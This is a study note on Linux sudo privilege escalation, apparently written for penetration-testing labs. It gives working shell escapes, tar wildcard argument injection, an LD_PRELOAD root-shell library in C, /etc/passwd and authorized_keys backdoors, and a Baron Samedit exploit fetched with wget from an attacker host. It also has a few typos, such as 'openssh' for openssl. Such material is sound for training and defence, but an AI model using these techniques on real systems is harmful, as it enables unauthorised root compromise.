---
created: 14-01-2026
tags:
  - Linux_PrivEsc
  - Linux
sticker: lucide//crown
---
## Sudo

>The **[`sudo`](https://wiki.archlinux.org/title/Sudo) (Super User DO)** command allows a user to execute commands as another user (usually `root`) based on rules defined in `/etc/sudoers` and `/etc/sudoers.d/*`.

>[!important] `sudo` grants **permission to run specific commands** under specific conditions.

- The most common use for `sudo` is executing commands as root. This is generally safer than logging in directly as root with `su`.

```bash
sudo <command>
```

- When you run `sudo <command>`, the system checks rules defined in `/etc/sudoers` and `/etc/sudoers.d/*` to determine whether you are allowed to run the `<command>` as another user (by default, root) with `sudo`. 
- If required (unless `NOPASSWD` is configured), you're prompted for the **password for your current user** (not the target user).
- Shell expansions (globs, variables, wildcards) occur before `sudo` checks.

>[!important] `sudo` logs both the command and its output.

>[!note] To learn more about `sudo` and its `/etc/sudoers`, see [[Inside the System/Linux/how_Linux_works/sudo]].

### Common `sudo` command options

| Option                     | Description                                                                                                                                |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| `-u`, `--user`             | Execute command as another user instead of root.                                                                                           |
| `-i`, `--login`            | Launch a login shell (similar to `su`).                                                                                                    |
| `-s`, `--shell`            | Start a shell specified in the `$SHELL` environment variable of the target user.                                                           |
| `-K`, `--remove-timestamp` | Force a password prompt next time you use `sudo`.                                                                                          |
| `-k`, `--reset-timestamp`  | Invalidate the `sudo` session (reset timestamp; password must be entered on next `sudo` run).                                              |
| `-l`, `--list`             | List the commands the current user is allowed to execute with `sudo`.                                                                      |
| `-D`, `--chdir`            | Specify the directory where to run the command.                                                                                            |
| `-R`, `--chroot`           | Specify a new root directory to change to before running the command.                                                                      |
| `-h`, `--host`             | Run command on the specified host.                                                                                                         |
| `-e`, `--edit`             | Edit one or more files rather than running a command (`sudoedit`).                                                                         |
| `-g`, `--group`            | Specify the primary group to run the command with instead of the primary group specified by the target user's password database entry.     |
| `-V`, `--version`          | Print the `sudo` version and exit.                                                                                                         |
| `-E`, `--peserve-env`      | Preserve user-defined environment variables in `sudo` environment. Error if the user doesn't have permissions to preserve the environment. |

### Restricted environment

- By default, when you run a command with `sudo`, it resets to a minimal environment which only includes essential variables like `PATH`, `HOME`, `TERM`, `SHELL`, `USER`, `LOGNAME`, and `SUDO_*` variables.
- `PATH` is set according to `secure_path` in `/etc/sudoers` (if it's configured):

```bash
# /etc/sudoers
Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

>[!note] See [[PATH_hijacking#`sudo` and `secure_path`]].

- `SUDO_*` variables include:
	- `SUDO_COMMAND`: The command that was executed via `sudo`.`
	- `SUDO_USER`: The username of the user who invoked `sudo`.
	- `SUDO_UID`: The UID of the `SUDO_USER`.
	- `SUDO_GID`: The GID of the `SUDO_USER`.
	- `SUDO_HOME`: The home directory of the user who invoked `sudo`.
	- `SUDO_TTY`: The name of the TTY (terminal) device associated with the current session (e.g., `/dev/pts/0`).

> [!example]+
> ```bash
> sudo env
> ```
> ```bash
> LANG=en_US.UTF-8
> PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
> MAIL=/var/mail/root
> LOGNAME=root
> USER=root
> HOME=/root
> SHELL=/usr/bin/bash
> SUDO_COMMAND=/usr/bin/env
> SUDO_USER=trigger
> SUDO_UID=1000
> SUDO_GID=1000
> SUDO_HOME=/home/trigger
> SUDO_TTY=/dev/pts/0
> ```

- Check `secure_path`:

```bash
sudo grep secure_path /etc/sudoers
```

>[!example]+
> ```bash
> sudo grep secure_path /etc/sudoers
> ```
>
> ```bash
> Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/bin"
> ```

What variables to preserve is controlled by the `env_keep` directives in `/etc/sudoers`. It specifies the environment variables to copy from your environment to the otherwise restricted `sudo` environment.

>[!example]+
> ```bash
> env_keep+=LD_PRELOAD
> env_keep+=LD_LIBRARY_PATH
> ```

>[!example]+
>The following configuration preserves `SUDO_EDITOR`, `EDITOR`, and `VISUAL` environment variables for the `visudo` command:
> 
> ```bash
> ## Preserve editor environment variables for visudo.  
> ## To preserve these for all commands, remove the "!visudo" qualifier.  
> Defaults!/usr/bin/visudo env_keep += "SUDO_EDITOR EDITOR VISUAL"
> ```


>[!important] `secure_path` **does not** affect root processes run without `sudo`, such as SUID binaries, Cron jobs, and systemd services.

- The `-E` (`--preserve-env`) flag tells `sudo` to **preserve environment variables**.
- `-E` without any arguments **preserves all variables**:

```bash
sudo -E <command>
```

```bash
sudo --preserve-env <command>
```

- You can also preserve only specific variables by passing a comma-separated list of those to the `-E` option:

```bash
sudo --preserve-env=HOME,PATH <command>
```

- To set specific variables for the command directly, place variable assignment right after `sudo` before options and the target command:

```bash
sudo HOME=/tmp <command>
```

>[!note] You can use `-E` only if [`SETENV`](https://man.archlinux.org/man/sudoers.5#SETENV) is set for your user in `sudoers`.
> 
> ```bash
> user  ALL=(ALL)       SETENV: /usr/bin/git
> ```

## Enumeration

- List commands you're allowed to run with `sudo`:

```bash
sudo -l
```

This shows:
- which commands you can run
- as which users
- whether a password is required
- environment restrictions

>[!warning] For the `sudo -l` command to work, your user must be allowed to use `sudo` in the first place, and you are usually to be asked for the user's password (unless `NOPASSWD` is configured).

> [!example]+
> ```bash
> sudo -l
> ```
> ```bash
> User user may run the following commands on host:
>     (root) NOPASSWD: /usr/bin/vim
> ```
> 
> - `(root)` → command runs as root
> - `NOPASSWD` → no password required; without this, you'll need to enter your current user's password
> - `/usr/bin/vim` → exact binary path allowed

> [!example]+
> ```bash
> sudo -l
> ```
> ```bash
> Matching Defaults entries for trigger on hostname:  
>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/bin  
>   
> Runas and Command-specific defaults for trigger:  
>    Defaults!/usr/bin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"  
>   
> User trigger may run the following commands on hostname:  
>    (ALL) ALL
> ```
> 
> - `secure_path` → the value of the `PATH` variable the command will use
> - `env_keep` → custom environment variables the user is allowed to pass to the command (others are overridden or ignored)
> - `(ALL)` → command can be run as any user
> - `ALL` → any command can be run

- More verbose output:

```bash
sudo -ll
```

- `sudo` version:

```bash
sudo -V
```

> [!note]+ `sudo` rules order and negations
> `sudo` evaluates rules in `/etc/sudoers` and `/etc/sudoers.d/*` **from top to bottom**, and **later rules override earlier ones**.
> 
> This means that:
> - A broad rule defined later can silently **override a restrictive rule defined earlier**
> - Negated rules (`!`) are not absolute — they only apply **until a later rule allows the same command**
> 
> For example:
> ```text
> user ALL=(root) ALL
> user ALL=(root) !/bin/bash
> ```
> The second rule blocks `/bin/bash`.  
> But if the order is reversed:
> ```text
> user ALL=(root) !/bin/bash
> user ALL=(root) ALL
> ```
> The restriction is **effectively removed**, and `/bin/bash` is allowed again.
> 
> In real environments, this commonly happens when:
> - Multiple files exist in `/etc/sudoers.d/`
> - Administrators add exceptions without considering rule order
> - Negations are assumed to be permanent restrictions
> 
> When reviewing `sudo -l` output, always consider **rule order and scope**, not just individual entries.

## Privilege escalation with misconfigured `sudo`

Overly permissive or misconfigured `sudo` rules can lead to privilege escalation vulnerabilities, just like with [[SUID_&_SGID_privilege_escalation|SUID and SGID binaries]].

>[!bug] If you are allowed to run _any_ command that can be coerced into executing arbitrary commands, you can usually get a shell as root.

This coercion typically happens through:
- shell escapes
- environment influence
- command arguments
- interpreters
- file writes
- wildcard or path abuse

Most `sudo` privilege escalation techniques fall into one of these buckets:
- Direct shell access
- Shell escapes
- Abuse of interpreters
- File write/overwrite
- Environment manipulation
- Wildcards/argument abuse
- `PATH` hijacking
- Known vulnerable `sudo` versions (last resort)
### Direct shell access

- If you are allowed to run a shell binary with `sudo` as a privileged user, you get **direct root shell access**:

```bash
sudo /bin/sh
```

```bash
sudo /bin/bash -p
```

>[!important]+ The `-p` flag
>- By default, Bash **resets its effective UID** (the actual privileges it's running with at a given moment) to its **real UID** (privileges of the user who launched it), rather than continuing to run with **SUID privileges** (privileges of the file owner).
>- The `-p` flag tells Bash to **preserve its effective UID**. 
>
>Without `-p`, you will get a non-privileged shell even if `sudo` was used.

### Shell escapes

- Many legitimate programs support **shell escapes** or have built-in features that can be used to **execute arbitrary commands**. If `sudo` grants access to one of these programs, you can get a root shell.
- Such programs mainly include:
	- Editors (`vim`, `nano`, `less`, `more`)
	- Interpreters (`python`, `perl`, `node`)
	- File viewers
	- Archive utilities (`tar`, `rsync`, `scp`)
	- Network tools
	- Debuggers

>[!bug] See the [`GTFOBins`](https://gtfobins.github.io/) project — a curated list of binaries and scripts that can be exploited for privilege escalation.


- [`vim`](https://gtfobins.github.io/gtfobins/vim/#sudo):

```bash
sudo vim -c ':!/bin/sh'
```

- [`vi`](https://gtfobins.github.io/gtfobins/vi/#sudo):

```bash
vi -c ':!/bin/sh' /dev/null
```

- [`less`](https://gtfobins.github.io/gtfobins/less/#sudo):

```bash
sudo less /etc/profile
!/bin/sh
```

- [`more`](https://gtfobins.github.io/gtfobins/more/#sudo):

```bash
TERM= sudo more /etc/profile
!/bin/sh
```

- [`man`](https://gtfobins.github.io/gtfobins/man/#sudo):

```bash
sudo man man
!/bin/sh
```


- [`python`](https://gtfobins.github.io/gtfobins/python/#sudo):

```bash
sudo python -c 'import os; os.system("/bin/sh")'
```


- [`perl`](https://gtfobins.github.io/gtfobins/perl/#sudo):

```bash
sudo perl -e 'exec "/bin/sh";'
```

- [`node`](https://gtfobins.github.io/gtfobins/node/#sudo):

```bash
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

>[!tip]+
>If you see a suspicious binary you're allowed to run with `sudo` but can't find a known escape, try searching the documentation of the command or tool (such as `man` pages) for anything you could use for privilege escalation.

### Wildcard abuse

- If your current user is allowed to run a command like `tar`, `rsync`, or `scp` with **wildcards** (`*`), you might be able to **escalate privilege via argument expansion**. 

Wildcard abuse applies to:
- `tar`
- `rsync`
- `zip`
- `cp`
- `chown`
- `find`
- `xargs`

>[!example]+
> - Check `sudo` configuration:
> 
> ```bash
> sudo -l
> ```
> 
> ```bash
> user ALL=(root) NOPASSWD: /usr/bin/tar -xzf *
> ```
> 
> - The administrator was probably intended to give you a permission to extract any files. But in reality, this allows you to create filenames that **become flags**. 
> 
> Here is how the wildcard `*` is expanded:
> 1. Your shell expands `*`.
> 2. `sudo` checks the expanded command. 
> 3. `tar` receives the arguments.
> 
> - You create several files in a directory you can write into:
> 
> ```bash
> touch -- --checkpoint=1
> touch -- --checkpoint-action=exec=/bin/sh
> ```
> 
> - Then you run:
> 
> ```bash
> sudo tar -xzf *
> ```
> 
> - `tar` sees:
> 
> ```bash
> tar --checkpoint=1 --checkpoint-action=exec=/bin/sh # ...
> ```
> 
> And you get root.


>[!note]+
>In the above example, you **can't simply use**
>```bash
>/usr/bin/tar -xzf --checkpoint=1 --checkpoint-action=exec=/bin/sh
>```
>Because this **doesn't match `/usr/bin/tar -xzf *`**. The wildcard **matches arguments**, not options.
>But if you **create files** with the appropriate names, they're **treated by `tar` as options**, but **as arguments by `sudo`**.

>[!note] A similar example was discussed in the context of Cron job privilege escalation. See [[Cron_jobs_privilege_escalation#Wildcard expansion]]).
### Environment abuse

By default, `sudo` **resets the environment to a minimal set of variables**, such as `PATH`, `TERM`, `HOME`, `SHELL`, `LOGNAME`, and `SUDO_*` variables (this is controlled by the `env_reset` directive in `/etc/sudoers`). 
The value of the `PATH` variable is taken from the `secure_path` option in `/etc/sudoers`, which is typically `usr/local/sbin:/usr/local/bin:/usr/bin`.

However, `sudo` can be configured to **inherit certain environment variables from the user's environment**, either for all commands or for only specific ones. 

>[!note] Refer to [[#Restricted environment]] above.

- Certain variables can be abused for privilege escalation, such as:
	- `LD_PRELOAD`
	- `LD_LIBRARY_PATH`
	- `PATH`
	- `PYTHONPATH`
	- `RERL5LIB`
	- `RUBYLIB`

>[!note] See [[environment_variables]].

>[!example]+ Example: `LD_PRELOAD` privilege escalation
> 
> - Check `sudo` configuration for your current user:
> 
> ```bash
> sudo -l
> ```
> 
> ```bash
> Matching Defaults entries for user on this host:  
>    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
> 
> User user may run the following commands on this host:
>    (root) NOPASSWD: /usr/sbin/apache2
> ```
> 
> `env_reset` resets all user environment variables, **except** those specified by `env_keep` — `LD_PRELOAD` and `LD_LIBRARY_PATH`. This is a direct path to library hijacking.
> 
> - Redefine a commonly used C function and save it as `shell.c`:
> 
> ```C
> #include <stdio.h>  
> #include <sys/types.h>  
> #include <stdlib.h>  
>   
> void _init() {  
>        unsetenv("LD_PRELOAD");  
>        setresuid(0,0,0);  
>        system("/bin/bash -p");  
> }
> ```
> 
> - Then compile the file as a shared library:
> 
> ```bash
> gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
> ```
> 
> - Now, set `LD_PRELOAD` to your custom library with **any** command you're allowed to run with `sudo`. Instead of a legitimate function in standard libraries, C code will use the function you defined (as `LD_PRELOAD` takes precedence) — the one that spawns a root shell: 
> 
> ```bash
> sudo LD_PRELOAD=/tmp/shell.so apache2
> ```
> >[!note] See [[shared_library_hijacking]].

### Custom binaries and scripts

If `sudo `allows you to execute custom binaries or scripts, your goal is to examine the executable to find if you can use it for privilege escalation.

>[!example]
> ```bash
> (user) ALL=(root) NOPASSWD: /opt/cleanup.sh
> ```

Basic binary analysis commands:

- Get file type and other relevant information (e.g., statically/dynamically linked, architecture, interpreter, etc.):

```bash
file /path/to/binary
```

- Readable strings:

```bash
strings /path/to/binary
```

- Trace library calls:

```bash
ltrace /path/to/binary
```

- Trace system calls:

```bash
strace /path/to/binary
```

Look for:
- Hardcoded passwords or keys
- Commands called without absolute paths (e.g., `system("ls")` instead of `system("/bin/ls")` — possible `PATH` hijacking)
- User-controlled input (command injection)

Check:
- Can you edit the script?
- Can you influence files it touches?
- Can you control arguments?

### File write/overwrite

If `sudo` allows you to:
- edit files
- move files
- copy files
…as root, you may be able to **modify privileged configuration** or **inject a payload**.

Common targets:
- `/etc/passwd`
- `/etc/sudoers`
- scripts executed by root
- service configuration files

>[!example]+
>If [`nano`](https://gtfobins.github.io/gtfobins/nano/#file-write) can be run with `sudo`, you may be able to **write to `/etc/passwd`**.
>```bash
>sudo nano /etc/passwd
>```
>- Create a new user:
>```bash
>user::0:0:user:/root:/bin/bash
>```
>- Then:
>```bash
>su user
>```


>[!example]+
> If `sudo` allows:
> 
> ```bash
> (root) /usr/bin/cp
> ```
> 
> You can overwrite a script executed by root (or, equally, a privileged Cron job/systemd timer):
> 
> ```bash
> sudo cp payload.sh /usr/local/bin/backup.sh
> ```

>[!example]+
> If you can run [`openssh`](https://gtfobins.org/gtfobins/openssl) with `sudo`, you can abuse it to write to arbitrary files on the system. Though there's no way to get the shell with it directly, it is possible to escalate privileges in a different way.
> 
> 
> - On your attacker machine, generate a pair of SSH keys:
> 
> ```bash
> ssh-keygen -t rsa
> ```
> 
> ```bash
> Generating public/private rsa key pair.
> Enter file in which to save the key (/home/user/.ssh/id_rsa): id_rsa
> Enter passphrase for "id_rsa" (empty for no passphrase): 
> Enter same passphrase again: 
> Your identification has been saved in id_rsa
> Your public key has been saved in id_rsa.pub
> The key fingerprint is:
> SHA256:TBdCgSv30NuK/srXZnLKKHbUINZeG42eY7Jdcv1nSO4 user@parrot
> The key's randomart image is:
> +---[RSA 3072]----+
> |       o+..      |
> |      .  . .     |
> |     . o.o.      |
> |    + *o=..      |
> |   . = BS* .     |
> |      + @ + . .  |
> |     . * B   + . |
> |    o.+o= =   + o|
> |   . +=++*   .Eo |
> +----[SHA256]-----+
> ```
> 
> - Then copy the public key and and write it into the `/root/.ssh/authorized_keys` file:
> 
> ```bash
> echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsTbv7/6J4OPKPBf1JCJzk0z0Ay8xRl3cScO+lcBIB7DjphyLBsclEokuBOjNBXM4Mt/TwhKcNOGFKdC7i6I/kgSsJTAUxICEmFqS7D5Y6RcnPVc+Sx9koSLnrdNayfXB1VH6pmBQ89Y2atGoxq7KDmT5fES/ubo4yjahkRqPd17WVthz/1yNS2wJvglv9/qmmNUNnfnPecTlWnZXvBZE6nd/FQj1RbqBx5IXwHa0gymRY9OtyHZS/ZIDgD1+S9LetskgKA08lIK0XRatiHaYWRC69J8IYN1q1LR7nmtavEYDAm5slzwACHpSwa/+5dwTBjpcvA4qeHuIuO+UfiSp4X9n3g8QtgtUPyDFOMQQ4iX6o4wp6YEcpqdPLIkpuZNtetYk/Mq6UiH3IzUxDOif7VB0A9g8chRDJ6LkR3R23aqVaTuUISnBGt7rOshQHWu+hdVOs1Jj1g5BPQ4zCXuvEAOLa3fZj1bVxgZX6HhqQBDxHRkKLbAfBUseGU5MOl90= user@parrot' | doas openssl enc -out /root/.ssh/authorized_keys
> ```
> 
> - Then SSH into the target machine as root using the matching private key, `id_rsa`:
> 
> ```bash
> ssh root@10.66.169.195 -i id_rsa
> ```
> 
> ```
> The authenticity of host '10.66.169.195 (10.66.169.195)' can't be established.
> ED25519 key fingerprint is SHA256:u+cHshV6MKleRbSWX34rMxAM6XuCoZ5ChS98cTrnPns.
> This key is not known by any other names.
> Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
> Warning: Permanently added '10.66.169.195' (ED25519) to the list of known hosts.
> Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)
> 
> # ...
> 
> root@plotted:~# whoami
> root
> root@plotted:~# 
> ```

## Vulnerable `sudo` versions

Vulnerable `sudo` versions are not that common to encounter as misconfigurations, but it's still worth a try. For a given version, try to find known exploits on GitHub or ExploitDB.

- Display `sudo` version:

```bash
sudo --version
```

```bash
sudo -V
```

>[!example]+
>```bash
>sudo --version
>```
> ```bash
> Sudo version 1.9.17p2  
> Sudoers policy plugin version 1.9.17p2  
> Sudoers file grammar version 50  
> Sudoers I/O plugin version 1.9.17p2  
> Sudoers audit plugin version 1.9.17p2
> ```


Common `sudo` vulnerabilities:
- [`CVE-2025-32463`](https://github.com/kh4sh3i/CVE-2025-32463)
	- `1.9.14 < sudo < 1.9.17`
- [`CVE-2025-32462`](https://github.com/cyberpoul/CVE-2025-32462-POC)
	- `sudo ≤ 1.9.17`
- [`CVE-2021-3156 — Baron Samedit`](https://github.com/worawit/CVE-2021-3156)
	- `sudo < 1.9.5p2`
- [`CVE-2019-14287 — Runas Bypass`](https://www.exploit-db.com/exploits/47502)
	- `sudo < 1.8.28`

>[!note] Misconfiguration beats version bugs almost every time.

### CVE-2021-3156

[`CVE-2021-3156 — Baron Samedit`](https://github.com/worawit/CVE-2021-3156) is based on a heap-based buffer overflow vulnerability. This affected the sudo versions `< 1.9.5p2`, including:
- `1.8.31` — Ubuntu 20.04
- `1.8.27` — Debian 10
- `1.9.2` — Fedora 33

The interesting thing about this vulnerability was that it had been present for over ten years until it was discovered. There is also a public [Proof-Of-Concept](https://github.com/blasty/CVE-2021-3156) that can be used for this.

- Get the `sudo` version:

```bash
sudo -V
```
```bash
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

- Fetch the exploit:

```bash
git clone https://github.com/blasty/CVE-2021-3156.git && cd "CVE-2021-3156"
```

- Serve from your attacker machine:

```bash
python3 -m http.server
```
```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- Fetch from the target:

```bash
wget http://10.10.16.25:8000/sudo-hax-me-a-sandwich
```

- Compile:

```bash
make
```
```
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```


- Execute:

```bash
./sudo-hax-me-a-sandwich
```
## References and further reading

- [`GTFOBins`](https://gtfobins.github.io/)
- [`Sudo — Arch Wiki`](https://wiki.archlinux.org/title/Sudo)
- [`Linux Privilege Escalation using Sudo Rights — Hacking Articles`](https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/)
- [`sudo — man pages`](https://man.archlinux.org/man/sudo.8)
- [`sudoers — man pages`](https://man.archlinux.org/man/sudoers.5)
- [`CVE-2021-3156 PoC`](https://github.com/blasty/CVE-2021-3156)
- [`CVE-2019-14287 Exploit`](https://www.exploit-db.com/exploits/47502)